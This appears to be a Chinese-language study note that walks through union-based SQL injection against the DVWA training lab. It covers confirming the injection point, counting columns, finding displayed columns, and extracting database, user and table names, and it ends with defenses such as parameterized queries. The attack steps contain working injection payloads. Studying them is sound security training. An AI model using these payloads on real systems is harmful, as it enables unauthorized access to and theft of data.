# SQL 注入 · 联合注入完整流程

## 本质

程序把用户输入直接拼进 SQL 语句，**数据库看到的是拼接后的一整条语句，分不出哪部分是用户输入、哪部分是代码**。

> 一句话：数据被当成了代码执行。

## 完整流程（DVWA · Low）

### 第 1 步：确认注入点

输入 `1`，页面正常返回一个用户。

输入 `1'`（单引号）：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'';
```

多出一个单引号，**引号配对被打乱**，数据库解析失败 → 报错。

**报错 = 存在注入点。**

为什么后面能利用：单引号的作用是**提前闭合字符串**，让后续输入从"数据区"越狱到"代码区"。

### 第 2 步：判断列数

```sql
1' order by 2 #     → 正常
1' order by 3 #     → 报错
```

`order by N` 是按第 N 列排序，N 超过列数就报错。**报错前的最后一个数字 = 列数 = 2。**

### 第 3 步：找回显位

```sql
1' union select 1,2 #
```

页面出现数字 `1` 和 `2`。

- `union` 要求前后列数一致，所以给两个值占位
- 页面**会显示**哪一列，那一列就是回显位

**这两个数字是我自己写进去的**，不是数据库返回的数据——它们只用来标记"这一列会显示在页面上"。

### 第 4 步：取数据

```sql
1' union select database(),user() #
```

页面显示：

```
First name: dvwa
Surname:    dvwa@localhost        ← 数据库用户，不是 root
```

位置可以互换（`select user(),database()` 也行），取决于哪一列会显示、类型是否兼容。

### 第 5 步：拿表名（进阶）

```sql
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
```

## 关键符号

| 符号 | 作用 |
|---|---|
| `'` | 闭合前面的单引号，越狱 |
| `union` | 追加一条**新查询**，而不是改条件 |
| `#` | 注释掉后面残留的单引号（MySQL） |
| `-- ` | 另一种注释（后面必须跟空格） |

## 为什么用 union 不用 or

| payload | 能干什么 |
|---|---|
| `1' or '1'='1` | 只能改条件，查的还是 users 表里已有的数据 |
| `1' union select ...` | 能执行**任意查询**，查任意表、调用任意函数 |

`or` 是"把门打开"，`union` 是"自己带东西进来"。

## 防御

| 优先级 | 措施 | 防住什么 |
|---|---|---|
| P0 | **预编译（参数化查询）** | 语句结构先编译，输入永远只作数据填充 |
| P1 | 数据库最小权限 | 即使被注入，也读不到其他库 |
| P1 | 关闭错误回显 | 不泄露 SQL 结构 |
| P2 | 输入校验、WAF | 缓解措施 |

**预编译为什么根治**：`SELECT * FROM users WHERE id = ?` 的结构先编译好，之后传进来的 `1' or '1'='1` 整串只当数据填进问号，不改变结构——引号就只是个普通字符。

## 三类注入（按数据怎么出来分）

| 类型 | 前提 | 数据从哪出来 |
|---|---|---|
| 联合注入 | 页面有回显位 | 直接显示在页面上 |
| 报错注入 | 有报错但不显示数据 | 藏在错误信息里 |
| 盲注 | 只有正常/异常两种页面 | 布尔判断或时间差逐字符猜 |

**判断顺序：有回显 → 联合；无回显但有报错 → 报错；都没有 → 盲注。**

## 一句话总结

> 注入是让数据变成代码，防御是让数据永远只是数据。
